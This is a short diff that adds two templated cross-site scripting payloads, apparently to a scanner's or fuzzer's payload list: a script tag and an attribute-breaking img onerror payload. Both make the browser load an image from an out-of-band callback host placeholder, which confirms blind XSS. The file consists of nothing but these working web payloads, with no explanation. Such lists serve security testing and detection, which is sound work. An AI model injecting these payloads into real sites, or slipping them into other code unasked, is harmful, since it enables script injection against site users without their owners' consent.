@@ -1,0 +1,2 @@
+<script>new Image().src='http://{{OOB}}/xss-{{RAND}}'</script>
+"'><img src=x onerror="new Image().src='http://{{OOB}}/xss-{{RAND}}'">
